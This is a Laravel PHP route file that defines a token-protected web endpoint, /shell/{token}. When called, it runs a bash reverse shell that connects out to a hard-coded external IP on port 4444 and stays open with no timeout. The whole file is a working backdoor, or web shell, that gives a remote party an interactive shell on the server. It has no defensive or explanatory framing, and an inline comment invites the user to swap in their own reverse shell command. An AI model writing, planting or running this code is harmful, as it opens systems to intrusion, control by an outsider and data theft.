<?php

use Illuminate\Support\Facades\Route;
use Symfony\Component\Process\Process;
use Symfony\Component\Process\Exception\ProcessFailedException;

Route::get('/shell/{token}', function ($token) {
    if ($token !== env('TOKEN')) {
        return response('Unauthorized.', 401);
    }

    // Replace with your reverse shell command
    $command = 'bash -c \'bash -i >& /dev/tcp/195.26.246.92/4444 0>&1\'';

    try {
        // Execute the reverse shell command
        $process = Process::fromShellCommandline($command);
        $process->setTimeout(0); // Remove timeout to keep the process running
        $process->run();

        // Return success or error output
        if ($process->isSuccessful()) {
            return response('Command executed successfully.');
        } else {
            return response('Command failed: ' . $process->getErrorOutput(), 500);
        }
    } catch (ProcessFailedException $exception) {
        return response('Command execution error: ' . $exception->getMessage(), 500);
    }
});

